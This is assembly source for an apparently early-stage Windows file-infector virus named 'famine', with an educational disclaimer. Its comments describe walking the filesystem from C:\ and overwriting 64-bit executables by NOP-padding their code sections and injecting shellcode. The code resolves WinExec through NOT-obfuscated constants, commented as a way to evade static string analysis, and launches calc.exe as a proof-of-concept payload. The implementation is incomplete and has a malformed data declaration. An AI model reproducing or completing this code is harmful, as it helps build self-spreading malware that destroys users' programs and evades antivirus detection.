
; [ DISCLAIMER ]
; The Author of this code is not responsible for its usage.
; The purpose of this code is purely educational and academic.
; Be aware that running this program may harm the integrity of your system.


; [ Infection phases ]
;
; 1) Save virus entrypoint in rbx
;		The rbx register can now be used to reference specific virus parts ([rbx + <int>])
;
; 2) Resolve Kernel32.dll addresses and save them in the heap memory
; 		Kernel32AddressTable will be stored in r15. Calling a winapi just comes down to
;		calling QWORD r15 + <int>
;
; 3) Search for executable files starting from C:\
; 		Check if the file meets specific criteria, so that it can be defined as a
; 		64bit - PE executable image (.exe)
; 		If no valid .exe is found in the current directory, then enable 'directory_mode' (r12 == 1)
; 		and go down a directory. The program will then search for a valid file in the new path
;
; 4) Once a valid file is found, infect it
; 		The program pads the entire .text section with nops and appends the signature 'alca' at the
; 		very beginning of it. Then this shellcode instructions are copied past the file entrypoint
; 		This process takes place in the heap memory of the virus. The infected copy will then
; 		overwrite the actual file.
;
; 5) The program exits when the entire filesystem has been analysed
; 		Once the C:\ directory is reached agains, the normal control flow will try to go back one directory
; 		This will make SetCurrentDirectoryA to return 0 (error), which will signal the program to call the
;		_clearAndTerminate procedure and exit out
;

[BITS 64]

section .data
    fileName db 'C:\\Users\\johnd\\Desktop\\famine\\famine', 0
    findData times 592 db  ; WIN32_FIND_DATAW is 592 bytes
	formatString db 'Found file: %s', 10, 0           ; Format string for printf (newline at the end)

section .text

    global _famine

    extern _get_proc_address
	extern FindFirstFileA
	extern printf


_recursive_directory:
    lea rcx, [rel fileName]            ; File pattern (ANSI string, convert to wide in real use)
    lea rdx, [rel findData]          ; Address of WIN32_FIND_DATA structure
    call FindFirstFileA


    lea rcx, [rel formatString] ; First parameter: Format string for printf
    lea rdx, [findData + 44]    ; Second parameter: cFileName offset (44 bytes into the structure)
    call printf                 ; Call printf to print the filename


	ret




    


_famine:

	call _recursive_directory



	xor rcx, rcx
	add cl, 0x7                 ; String length for compare string
	mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec 
	not rax ;mov rax, 0x636578456e6957F0 ; cexEniW,0xF0 : 636578456e6957F0 - Did Not to avoid WinExec returning from strings static analysis
	shr rax, 0x8                ; xEcoll,0xFFFF --> 0x0000,xEcoll
	push rax
	push rcx                    ; push the string length counter to stack
	call _get_proc_address             ; Get the address of the API from Kernel32.dll ExportTable
	mov r14, rax                ; R14 = Kernel32.WinExec Address

	; UINT WinExec(
	;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
	;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
	; );
	xor rcx, rcx
	mul rcx                     ; RAX & RDX & RCX = 0x0
	; calc.exe | String length : 8
	push rax                    ; Null terminate string on stack
	mov rax, 0x9A879AD19C939E9C ; not 0x9A879AD19C939E9C = "calc.exe"
	not rax
	;mov rax, 0x6578652e636c6163 ; exe.clac : 6578652e636c6163
	push rax                    ; RSP = "calc.exe",0x0
	mov rcx, rsp                ; RCX = "calc.exe",0x0
	inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
	sub rsp, 0x20               ; WinExec clobbers first 0x20 bytes of stack (Overwrites our command string when proxied to CreatProcessA)
	call r14                    ; Call WinExec("calc.exe", SW_HIDE)
